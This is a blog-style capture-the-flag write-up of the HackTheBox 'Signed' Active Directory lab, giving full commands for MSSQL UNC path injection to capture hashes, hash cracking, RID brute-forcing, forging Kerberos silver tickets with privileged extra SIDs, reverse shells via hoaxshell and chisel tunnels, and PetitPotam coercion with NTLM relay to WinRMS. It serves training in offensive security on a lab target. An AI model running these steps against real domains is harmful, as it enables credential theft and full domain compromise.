---
title: "Signed HackTheBox" 
date: 2025-10-12 02:00:00 0000+
tags: [WriteUp, Signed, HTB, chisel, NTLM Relay, MSSQL, MSSQL Impersonation, Administor Bulk Operations, OPENROWSET, Bulk Administrator Read, UNC path injection, winrms relay, SilverTicket, PAC, ExtraSids, DiamondTicket, MSSQL Rid Bruteforcing, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Signed_HTB/preview_signed.png
---
# Signed HTB Writeup

`Signed` is a `medium` level `active directory` box which is an assumed breach scenario (in this case mssql) and this box is unique in its own way since only MSSQL port is open on the box. We start off with initials access, exploiting `UNC path injection` we gain a Domain user which can `forge tickets` and add `PAC` for more privileged accounts generating a silver ticket allowing us to pwn this box with administrator access.

![image.png](/assets/images/Signed_HTB/image.png)

## Initial Enumeration

We start with the rustmap to find open ports and services running on the box.

```bash
rustmap.py -ip 10.129.245.27
```

![image.png](/assets/images/Signed_HTB/image%201.png)

We have only one port open on the box and that is MSSQL.

## Exploitation

### Shell as MSSSQLSVC

Lets enumerate this MSSQL port more.

```bash
nxc mssql 10.129.245.27 -u 'scott' -p 'Sm230#C5NatH' --local-auth
```

![image.png](/assets/images/Signed_HTB/image%202.png)

Scoot is the authenticated user which is not domain joined I think so i.e. we have successful authentication locally.

Now looking at the results we add DC01.SIGNED.HTB and SIGNED.HTB to our /etc/hosts file.

Now connecting to the MSSQL service using impacket’s mssqlclient.

```bash
impacket-mssqlclient signed.htb/'scott':'Sm230#C5NatH'@dc01.signed.htb
```

![image.png](/assets/images/Signed_HTB/image%203.png)

And we are in!

Now lets enumerate more.

### UNC Path Injection

Lets try to do a simple UNC path injection.

```sql
xp_dirtree "\\10.10.14.7\share\aashwin"
```

![image.png](/assets/images/Signed_HTB/image%204.png)

![image.png](/assets/images/Signed_HTB/image%205.png)

Captured the hash of the mssqlsvc account.

Lets try to crack it using Hashcat.

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Signed_HTB/image%206.png)

We have another set of credentials for the mssqlsvc user.

**Now the key thing to note here is that the MSSQLSVC is a domain joined user, so it cannot authenticate with the domain locally we need to remove the local auth flag from NetExec and add a Windows auth flag to our mssqlclient python script to be able to authenticate.**

![image.png](/assets/images/Signed_HTB/image%207.png)

And we have a shell on the domain account mssqlsvc.

Let now enumerate more on this mssql instance.

There were no links, no impersonations available.

But when we enumerated the logins we can see that the **sa, SIGNED\IT, NT SERVICE\SQLWriter, Winmgmt, MSSQLSERVER, SQLSERVERAGENT,** these are the sysadmins.

![image.png](/assets/images/Signed_HTB/image%208.png)

Now here the things get finicky, I did a lot of research on this part.

Here it goes, We can forge a kerberos silver ticket and the key thing to do while forging a silver ticket is that we need to add the PAC of the privileged groups to it.

### Kerberos Silver Ticket and PAC Signing

Like in our case we need to add the PAC (or u can say user SID) of the more privileged group in our domain to our forging silver ticket.

The syntax to forge a silver ticket looks like this. 

```bash
impacket-ticketer -spn '<MSSQLSVC SPN>' -domain-sid '<DOMAIN SID>' -domain signed.htb -user-id '<userid of the account to sign ticket>' -extra-sid '<extragroups to add>' -nthash '<NT hash of service account>' mssqlsvc_ticket
```

So we need some things to be able to get to this.

**MSSQLSVC SPN, DOMAIN SID, USER ID, EXTRA SIDs and the NT hash of our MSSQL account.**

For the SPN we need to guess it and mostly is default for our mssqlsvc service account → **MSSQLSVC/DC01.SIGNED.HTB**

We can get the domain SID in many ways, what I used is somewhat odd.

---

From our MSSQLSVC low privileged shell we go to our $Recycle.Bin folder and since we have xp_dirtree access we can list the directories there.

![image.png](/assets/images/Signed_HTB/image%209.png)

There’s an administrator folder there and the administrator’s SID.

Removing the 500 (user-sid part) we obtained the Domain SID.

**Domain Sid- S-1-5-21-4088429403-1159899800-2753317549**

Now lets retrieve the list of user-sids of this domain using NetExec.

We can perform an RID Bruteforce attack using mssql as a medium.

```bash
nxc mssql signed.htb -u mssqlsvc -p 'purPLE9795!@' --rid-brute
```

![image.png](/assets/images/Signed_HTB/image%2010.png)

So now we have the useful sids of the users.

Now lastly we need the NT hash of the Mssqlsvc account.

This can be possible with this simple python script to convert the password to md4 and then encode it with utf-16le format.

```python
import hashlib
password = "purPLE9795!@"
ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
print(ntlm_hash)
```

Running this script gives us the NT Hash as of MSSQLSVC service account as → **ef699384c3285c54128a3ee1ddb1a0cc**.

---

We now have all the parameters to forge a silver ticket.

```bash
impacket-ticketer -spn 'MSSQLSvc/DC01.SIGNED.HTB' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -user-id '1103' -extra-sid 'S-1-5-21-4088429403-1159899800-2753317549-1105' -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' mssqlsvc_it_ticket
```

![image.png](/assets/images/Signed_HTB/image%2011.png)

Exporting it.

```bash
export KRB5CCNAME=mssqlsvc_it_ticket.ccache
klist
```

![image.png](/assets/images/Signed_HTB/image%2012.png)

Now we have a valid silver ticket across the domain.

I will now authenticate with mssql service using kerberos, although kerberos is not open but it is running passively, its port is however not exposed to us, I maybe wrong here.

```bash
impacket-mssqlclient -k -no-pass dc01.signed.htb -windows-auth
```

![image.png](/assets/images/Signed_HTB/image%2013.png)

See now we have a shell as **dbo@master.**

Trying to enable the xp_cmdshell now.

![image.png](/assets/images/Signed_HTB/image%2014.png)

Now we run hoaxshell to get a better shell and executing it.

```bash
/opt/hoaxshell/hoaxshell.py -s 10.10.14.7 -p 9002
```

![image.png](/assets/images/Signed_HTB/image%2015.png)

Now we can read the user flag.

![image.png](/assets/images/Signed_HTB/image%2016.png)

## Privilege Escalation

### Kerberos Silver Ticket

Now for the privilege escalation part, the worst part is that we have the mssqlsvc account’s password and we can forge tickets for any user in the domain.

Similarly what we did for the user flag we do here too we need to add the SIGNED\IT group to the EXTRA SIDs tag, the IT group and will also add the domain admins and the enterprise admins group too.

```bash
impacket-ticketer -spn 'MSSQLSvc/DC01.SIGNED.HTB' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -user-id '1103' -extra-sid 'S-1-5-21-4088429403-1159899800-2753317549-1105,S-1-5-21-4088429403-1159899800-2753317549-512,S-1-5-2
1-4088429403-1159899800-2753317549-519' -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' diamond_administrator_ticket
```

![image.png](/assets/images/Signed_HTB/image%2017.png)

Exporting it.

```bash
export KRB5CCNAME=diamond_administrator_ticket.ccache
klist
```

![image.png](/assets/images/Signed_HTB/image%2018.png)

Logging in MSSQL using mssqlclient.py

```bash
impacket-mssqlclient -k -no-pass dc01.signed.htb -windows-auth
```

![image.png](/assets/images/Signed_HTB/image%2019.png)

We are the Mssqlsvc user only but this time we have more privileges.

There is a method by which we can read system files, this will also prove that we have sysadmin privileges.

This is **READ FILE with OPENROWSET**

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

In this the BULK option requires the **ADMINISTER BULK OPERATIONS** or the **ADMINISTER DATABASE BULK OPERATIONS** permissions.

We can check for those permissions using this.

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```

So lets check these permissions.

![image.png](/assets/images/Signed_HTB/image%2020.png)

On our privileged shell we have these permissions.

Lets now try to read our system flag.

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
```

![image.png](/assets/images/Signed_HTB/image%2021.png)

As you can see we clearly have read access to the system files.

Submitting the root.txt!

### NTLM Reflection (Intended way)

Now for this to work from our privileged shell as mssqlsvc, we ran Chisel to forward all the internal ports through SOCKS proxy.

First lets start the server on our attacker machine.

```bash
chisel server -p 8000 --reverse --socks5
```

![image.png](/assets/images/Signed_HTB/image%2022.png)

```bash
.\chisel.exe client 10.10.14.52:8000 R:socks
```

![image.png](/assets/images/Signed_HTB/image%2023.png)

Now for this attack to work we need **SMB Signing to False** it will not work if its on, this is the patch that microsoft released for it in March 2025 to fix this vulnerbility. 

But in our case it still works since **WINRMS and MSSQL** ports are open.

![image.png](/assets/images/Signed_HTB/image%2024.png)

So we need some tools to start with like.

**DNSTOOL** → This will poison the DNS and we will point that to our IP.

**NTLMRELAYX** → listens for NTLM authentication attempts and relays them to a target system to gain access.

**PETITPOTAM** → Module to coerce the DC in connecting back to us on our IP

First we will add the fake DNS query using DNS Tool.

```bash
proxychains -q python3 /opt/krbrelayx/dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' -d 10.10.14.52 -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -dns-ip 10.129.242.173 10.129.242.173 --allow-multiple
```

![image.png](/assets/images/Signed_HTB/image%2025.png)

After adding the fake DNS record, We listen for NTLM Authentication and relay them to our machine using winrms.

```bash
proxychains -q ntlmrelayx.py -smb2support -t winrms://10.129.242.173 -i
```

![image.png](/assets/images/Signed_HTB/image%2026.png)

For the NTLM Authentication we will use SMB to make the DC connect to our NTLM RELAY server, which then points everything to the DNS query given, which is obviously a fake and lets us connect back to us.

```bash
proxychains -q nxc smb signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

![image.png](/assets/images/Signed_HTB/image%2027.png)

After some time we can see on ntlmrelayx that it has opened a winrms shell on the port 11000 on our localhost.

```bash
nc 127.0.0.1 11000
```

![image.png](/assets/images/Signed_HTB/image%2028.png)

![image.png](/assets/images/Signed_HTB/image%2029.png)

Connecting to it using netcat and retrieving our root.txt flag.

## Beyond Root

### Preventing Over permissive privileges on Silver Tickets

I observed this later, In the privilege escalation part I had signed a silver ticket with 3 PACs which is not necessary.

We only need to sign the PAC using the high privileged group of **SIGNED\IT** and we get the read permissions on the root flag.

So we must avoid signing over permissive privileges on silver tickets.

**Silver Ticket Limitation: With a silver ticket, as long as the service being accessed (like MSSQL or CIFS) trusts the authenticity of the ticket (because it was encrypted with its own account's hash), it will accept any group membership/SID claims in the ticket without verifying with the DC.**

```bash
impacket-ticketer -spn 'MSSQLSvc/DC01.SIGNED.HTB' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -user-id '1103' -extra-sid 'S-1-5-21-4088429403-1159899800-2753317549-1105' -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' diamond_administrator_ticket
```

![image.png](/assets/images/Signed_HTB/image%2030.png)

Rooted!

![image.png](/assets/images/Signed_HTB/image%2031.png)

Thanks for reading 😊✌️
